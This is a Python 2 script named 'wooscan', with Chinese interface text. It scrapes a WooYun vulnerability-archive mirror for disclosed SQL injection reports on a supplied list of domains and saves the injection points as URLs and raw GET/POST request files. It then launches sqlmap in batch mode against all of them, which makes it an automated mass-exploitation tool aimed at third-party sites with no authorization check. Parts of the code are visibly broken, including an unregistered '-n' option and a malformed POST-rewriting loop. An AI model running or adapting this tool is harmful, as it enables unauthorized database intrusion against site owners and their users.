#!/usr/bin/python
#coding=utf-8
#由于<code><code>中洞主提交内容千奇百怪，懒得继续处理过滤，所以有些注入点会比较不精确，多多包涵吧

import sys
import requests
import re
import os
import time
import getopt
import shutil
from bs4 import BeautifulSoup
import stat

#颜色及符号
green='\033[1;32;40m'
red='\033[1;31;40m'
blue='\033[1;34;40m'
cyan='\033[1;36;40m'
nor='\033[0m'
war='!'*50
frame='-'*50
star='*'*50

#头部
print cyan+star
print '欢迎使用wooscan\n作者:tail\nqq:1652429283\n如果脚本出现错误，请提交给我，感谢！\n查看帮助请使用-h选项\n'+star+nor

#参数
opts,args=getopt.getopt(sys.argv[1:],"hdf:t:",['help','delay=','path='])
for opt,value in opts:
    if opt=='-h':
        print green
        print star
        print '-h,--help               显示帮助信息并退出'
        print '-f  文件名.txt          域名文件'
        print '--delay 秒数            延长爬行时间，默认三秒'
        print '-t  秒数                设定爬行超时时间，默认二十秒'
        print '-d                      对你提供的域名文件进行根域提取处理并自动继续寻找注入点，可以配合-f参数'
        print '--path  sqlmap路径      指定sqlmap路径，例如/root/sqlmap/sqlmap.py'
        print '例子:\npython wooscan.py -f urltest.txt      对urltest.txt文件内的域名进行测试'
        print 'python wooscan.py -d -f urltest.txt  对urltest.txt内域名进行提取根域名处理，然后再开始测试'
        print star
        print nor
        sys.exit()

#检测wooyunoutput文件夹     
path=os.getcwd()
folder=os.path.exists('wooyunoutput')
for op,value in opts:
    if op=='-n':
        folder='Skip'
if folder==True:
    print '\n脚本每次运行都会输出结果文件，长时间后将积累大量文件占用空间\n'
    print '将开始清理上次残留的wooyunoutput文件夹\n'
    print '如果不想清理可以向脚本提交-n参数'
    shutil.rmtree('wooyunoutput')
    os.makedirs('wooyunoutput')
elif folder=='Skip':
    print '不清理残留文件夹'
elif folder==False:
    print '将在当前工作目录创建wooyunoutput目录用以存储输出文件'
    try:
        os.makedirs('wooyunoutput')
    except:
        print war+'不能成功在当前目录创建wooyunoutput文件夹，请检查权限等问题.'+nor
os.chdir(path+'/wooyunoutput')


#各参数初始值
fname='url.txt'
delay=3    #延时秒数
sec=20     #超时秒数


def exists():
    if os.path.exists('../'+fname)==True:
        print '\n注意,为了保证更高的搜索成功率,请对文件内的域名进行根域名提取处理，可以自行处理，也可以使用-f参数指定文件,-d参数执行根域名提取处理'
        print '\n开始检测'
    elif os.path.exists('../'+fname)==False:
        print red
        print '[!]发生错误,'+fname+'文件不存在，请检查是否存在于当前目录\n'
        print '[*]提示:脚本默认检查url.txt，使用-f参数可指定文件，-d参数进行提取根域名\n'
        print '[!]脚本退出'      
        print nor
        sys.exit()

#参数指定文件部分
for name,value in opts:
    if name=='-f':
        print '你提交的文件名字为'+value
        fname=value
        exists()

headers={'user-agent':'Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html）','Accept':'*/*'}

#根域名提取部分
for op,value in opts:
    if op=='-d':
        print green
        print '将开始对'+fname+'文件内的域名进行根域提取'
        content=open('../'+fname).read()
        jieguo=open('../url2.txt','wb')
        url='http://www.a-site.cn/tool/domain/'
        data1={'content':content,'submit':'提取+去重'}
        a='<textarea id="content" name="content" placeholder="\xe8\xbe\x93\xe5\x85\xa5\xe9\x93\xbe\xe6\x8e\xa5url\xe5\x88\xb0\xe8\xbf\x99\xe9\x87\x8c\xef\xbc\x8c\xe4\xb8\x80\xe8\xa1\x8c\xe4\xb8\x80\xe4\xb8\xaa\xef\xbc\x9b\xe6\x96\x87\xe6\x9c\xac\xe9\x95\xbf\xe5\xba\xa6\xe4\xb8\x8d\xe8\xb6\x85\xe8\xbf\x872M\xef\xbc\x9b\xe6\x95\xb4\xe7\x90\x86\xe7\xbb\x93\xe6\x9e\x9c\xe5\xb7\xb2\xe4\xbc\x98\xe5\x8c\x96\xe4\xb8\xbaExcel\xe5\x85\xbc\xe5\xae\xb9\xe6\xa0\xbc\xe5\xbc\x8f\xef\xbc\x8c\xe5\x8f\xaf\xe7\x9b\xb4\xe6\x8e\xa5\xe5\xa4\x8d\xe5\x88\xb6\xe7\xb2\x98\xe8\xb4\xb4\xe5\x88\xb0Excel\xe8\xa1\xa8\xe4\xb8\xad\xef\xbc\x8c\xe6\xa0\xbc\xe5\xbc\x8f\xe4\xb8\xba\xef\xbc\x9a\xe4\xb8\xbb\xe5\x9f\x9f\xe5\x90\x8d \xe6\x9d\xa5\xe6\xba\x90\xe6\x96\x87\xe6\x9c\xac" rows="30" style="width:98%;border:2px solid rgb(233, 78, 56);">'
        b='</textarea>'
        html11=requests.post(url,data1,headers=headers) 
        html11.encoding='utf-8'
        soup11=BeautifulSoup(html11.text,'html.parser')
        root=soup11.textarea
        c=str(root)
        d=c.replace(a,'')
        e=d.replace(b,'')
        data2={'content':e,'submit':'只留根域'}

        html22=requests.post(url,data2,headers=headers)
        html22.encoding='utf-8'
        soup22=BeautifulSoup(html22.text,'html.parser')
        root1=soup22.textarea
        cc=str(root1)
        dd=cc.replace(a,'')
        ee=dd.replace(b,'')
        print '已成功获得所有根域名:\n\n'+ee
        ff=ee.strip().split()
        gg='\n'.join(ff)
        jieguo.write(gg)
        print '结果已输出至url2.txt文件'
        print nor
        jieguo.close()
        fname='url2.txt'

for delay,value in opts:
    if delay=='--delay':
        delay=value
        print '你设定延时秒数为'+value
        time.sleep(int(delay))
for timesec,value in opts:
    if timesec=='-t':
        sec=value
        print '你设定超时时间为'+sec+'秒'
        
f=open('../'+fname)
#获取域名文件内容部分
domain=f.readlines()
o1=open('u.txt','w+')
o2=open('error.txt','w+')

#get包、post包以时间命名
def timefile():
    ISOTIMEFORMAT='%Y%m%d%H%M%S'
    name=time.strftime(ISOTIMEFORMAT)
    filename=name+'.txt'
    if start2==True:
        z=open('get'+filename,'w')
        z.write(resultc)
        z.close()
        print cyan+'[+]发现一个GET包型注入点,已写入get'+filename+nor
    if start3==True:
        z=open('post'+filename,'w')
        z.write(resultc)
        z.close()
        print cyan+'[+]发现一个POST包型注入点，已写入post'+filename+nor
        p=open('post'+filename,'w') #用于重新写入修改后post包
        new=open('post'+filename)   #刚才写入的原始post包文件
        new1=new.readlines()
#删除最后一行的body部分:
        for line in new1:
            if 'POST' in line:
                p.write(line)
            elif ':' in line:
                p.write(line)
            else:
                continue
#重新写入修改后的最后一行: 
            ff=new1[-1]
            fff=ff.split()[0]
            ffff=fff.replace('\'','')
            p.write('\n'+ffff)
            new.close()
            p.close()

print green
print '[*]开始连接镜像站...'
print nor

try:
    connect=requests.get('http://wooyun.chamd5.org',headers=headers,timeout=int(sec))
    print green+'[*]成功连接镜像站，开始爬行，请稍候'+nor
except requests.exceptions.ConnectionError:
    print '超时！'
    print '如多次超时，可能是你的ip已经被网站屏蔽，请使用代理或者等待恢复访问'
    sys.exit()
except requests.exceptions.ConnectTimeout:
    print red+frame+'[!]发生错误,与漏洞库建立连接超过'+sec+'秒，原因可能是网络出现问题或频繁的请求被拦截\n如果确认网络无问题请等候片刻再重新运行脚本\n\n使用--delay参数可以设置延时秒数(默认延时三秒)\n使用-t可以设置超时时间（默认二十秒后超时）\n更多帮助请使用-h或--help查看\n'+frame+nor
    y=raw_input('是否再次请求并设定超时时间为30秒?(Y/N)\n请输入(回车将自动选择Y)')
    if y=='Y' or y=='y' or y=='':
        print '[*]脚本将等待30秒响应'
        try:
            wait=requests.get(url,headers=headers,timeout=int(sec))
        except:
            print '[!]网站过长时间无响应，请查看脚本帮助信息增加请求延时或自行修改源码中镜像库地址'
            sys.exit()
    elif y=='N' or y=='n':
        print '脚本将退出'
        sys.exit()
    else:
        print y+'不是正确的输入选项'
        sys.exit()

for line in domain:
    url='http://wooyun.chamd5.org/searchbug.php?q=%E5%BF%BD%E7%95%A5&q=SQL%E6%B3%A8%E5%B0%84%E6%BC%8F%E6%B4%9E&q='+line.strip()
    try:
        html=requests.get(url,headers=headers,timeout=int(sec))
    except:
        print '异常'
        continue
    soup=BeautifulSoup(html.text,'html.parser')
    mm=re.compile(r'bug_detail.php.*?">')
    print blue+'\n当前域名:'+line+nor
    a=mm.findall(str(soup))
    for line in a:
        repp=line.replace('">','')
        url='http://wooyun.chamd5.org/'+repp
        try:
            html2=requests.get(url,headers=headers,timeout=int(sec))
        except:
            print war+'\n[!]连接网站成功但爬取漏洞信息中途失去连接,如果非自行退出请稍后再试,也可以增加延时秒数或超时秒数\n'+war
            sys.exit()
        code=BeautifulSoup(html2.text,'html.parser')
        mdaaa=re.compile(r'<code>.*?</code>')
        xx=mdaaa.findall(str(code))
        for line in xx:
            reppp=line.replace('<code>','')
            repppp=reppp.replace('</code>','')
            try:
                guolv=repppp.split()[0]
            except:
                continue
            guolv1=guolv.replace('\'','')
            guolv2=guolv1.replace('<br/>','')
            guolv3=guolv2.replace('</br>','')
            guolv4=guolv3.replace('<br>','')
            resulta=repppp.replace('<br/>','\n')
            resultb=resulta.replace('<br>','\n')
            resultc=resultb.replace('</br>','\n')
            start1=repppp.startswith('http://') 
            start2=repppp.startswith('GET')
            start3=repppp.startswith('POST')
            if (start1==True):
                print cyan+'[+]发现一个url注入点,已写入u.txt'+nor
                o1.write(guolv4+'\n')
            elif (start2==True or start3==True):
                timefile()    

            else:
                print red+'[-]未检测到标准注入目标，已写入error.txt，请手工查看'+nor
                o2.write(repppp+'\n\n')

f.close()
o1.close()
o2.close()

sqlmappath='sqlmap'
for pa,value in opts:
    if pa=='--path':
        if os.path.exists(value)==True:
            print '你的sqlmap路径为'+value
            sqlmappath='python '+value
        elif os.path.exists(value)==False:
            print '请提交正确的sqlmap地址'
            exit()

print green
ask=raw_input('结果已写入wooyunoutput目录\n\n是否调用sqlmap对结果自动测试?（Y/N）\n\n脚本默认直接运行sqlmap命令，如果需要自定义路径请使用--path参数指定\n[$]提示:如果url过多，测试时间可能会比较长\n\n输入(回车将自动开始):')
print nor

if ask=='Y' or ask=='y' or ask=='':   
    print cyan+'因为测试时间问题，脚本未添加自动整理sqlmap结果功能，想查看结果可以等sqlmap运行结束后，在日志表格中查看结果\n\nwindows默认位于c:/users/你的用户名/.sqlmap/outout/\nlinux默认位于/root/.sqlmap/output/\n按时间排序后最新的表格文件即为注入结果\n\n一秒后开始运行sqlmap'+nor
    time.sleep(1)
    utest=os.system(sqlmappath+' -m u.txt --batch --random-agent')
    for root,dirs,files in os.walk('.'):
        for line in files:
            pattern1=re.compile(r'get')
            pattern2=re.compile(r'post')
            getfind=re.match(pattern1,line)
            postfind=re.match(pattern2,line)
            if getfind:
                print 'get:'+line
                gtest=os.system(sqlmappath+' -r '+line+' --batch --random-agent')
            elif postfind:
                print 'post:'+line
                ptest=os.system(sqlmappath+' -r '+line+' --batch --random-agent')
            print cyan
            print '已经跑完全部注入点，可以按照之前提示查看结果,byebye!'
            print nor
elif ask=='n' or ask=='N':
    print '[!]脚本退出'
    sys.exit()
else:
    print '抱歉，你输入的内容不在选项之内'
    print '[!]脚本退出'
    sys.exit()
